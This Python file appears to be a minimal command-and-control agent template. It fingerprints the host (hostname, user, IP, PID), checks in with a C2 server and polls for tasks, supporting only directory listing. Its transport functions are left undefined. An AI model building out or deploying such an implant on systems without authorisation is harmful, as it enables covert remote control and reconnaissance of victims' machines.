#!/usr/bin/env python3
import os
import sys
import json
import base64
import time
import random
import socket
import platform
import subprocess
from datetime import datetime

# Will be replaced during build
VERSION = "{{VERSION}}"
DEBUG = False

class IgiderTestAgent:
    def __init__(self):
        self.uuid = self.generate_uuid()
        self.hostname = socket.gethostname()
        self.username = self.get_username()
        self.os_type = platform.system()
        self.commands = {
            "ls": self.ls_command
        }
        self.debug_print(f"IgiderTest Agent v{VERSION} initialized")
        self.debug_print(f"UUID: {self.uuid}")
        
    def debug_print(self, message):
        if DEBUG:
            print(f"[DEBUG] {message}")
    
    def generate_uuid(self):
        """Generate a unique identifier for this agent."""
        return f"igider-{random.randint(10000, 99999)}"
    
    def get_username(self):
        """Get the current username."""
        if self.os_type == "Windows":
            return os.environ.get("USERNAME", "unknown")
        else:
            return os.environ.get("USER", "unknown")
    
    def ls_command(self, args=None):
        """List directory contents."""
        try:
            target_dir = args.strip() if args else "."
            if not os.path.exists(target_dir):
                return {"status": "error", "message": f"Directory not found: {target_dir}"}
            
            files = []
            for entry in os.scandir(target_dir):
                file_info = {
                    "name": entry.name,
                    "is_dir": entry.is_dir(),
                    "size": entry.stat().st_size if not entry.is_dir() else 0,
                    "permissions": oct(entry.stat().st_mode)[-3:],
                    "last_modified": datetime.fromtimestamp(entry.stat().st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                }
                files.append(file_info)
            
            return {
                "status": "success", 
                "path": os.path.abspath(target_dir),
                "files": files
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def process_command(self, command_data):
        """Process incoming command from C2."""
        try:
            cmd_type = command_data.get("command")
            cmd_args = command_data.get("arguments", "")
            task_id = command_data.get("task_id", "unknown")
            
            self.debug_print(f"Processing command: {cmd_type} with arguments: {cmd_args}")
            
            if cmd_type in self.commands:
                result = self.commands[cmd_type](cmd_args)
                response = {
                    "task_id": task_id,
                    "status": "completed",
                    "result": result
                }
            else:
                response = {
                    "task_id": task_id,
                    "status": "error",
                    "result": {"message": f"Command not supported: {cmd_type}"}
                }
                
            return response
        except Exception as e:
            return {
                "task_id": command_data.get("task_id", "unknown"),
                "status": "error",
                "result": {"message": f"Error processing command: {str(e)}"}
            }
    
    def checkin(self):
        """Send initial checkin data to the C2 server."""
        checkin_data = {
            "action": "checkin",
            "uuid": self.uuid,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os_type,
            "ip": self.get_ip(),
            "pid": os.getpid(),
            "version": VERSION
        }
        return checkin_data
    
    def get_ip(self):
        """Get primary IP address."""
        try:
            # Create a socket to connect externally (doesn't actually connect)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def run(self):
        """Main agent execution loop."""
        try:
            # Initial check-in
            initial_data = self.checkin()
            response = send_data(initial_data)
            
            if not response or "status" not in response or response["status"] != "success":
                self.debug_print("Failed initial checkin, exiting")
                return
            
            self.debug_print("Successfully checked in")
            
            # Main command loop
            while True:
                try:
                    self.debug_print("Fetching tasks...")
                    tasks = get_tasks(self.uuid)
                    
                    if tasks and "tasks" in tasks and tasks["tasks"]:
                        for task in tasks["tasks"]:
                            self.debug_print(f"Processing task: {task.get('task_id')}")
                            result = self.process_command(task)
                            self.debug_print(f"Sending result for task: {task.get('task_id')}")
                            send_data(result)
                    
                    # Sleep to avoid hammering the C2
                    time.sleep(5)
                except Exception as e:
                    self.debug_print(f"Error in main loop: {str(e)}")
                    time.sleep(10)  # Sleep longer on error
            
        except KeyboardInterrupt:
            self.debug_print("Agent execution interrupted")
        except Exception as e:
            self.debug_print(f"Fatal error: {str(e)}")

# Main execution
if __name__ == "__main__":
    agent = IgiderTestAgent()
    agent.run()
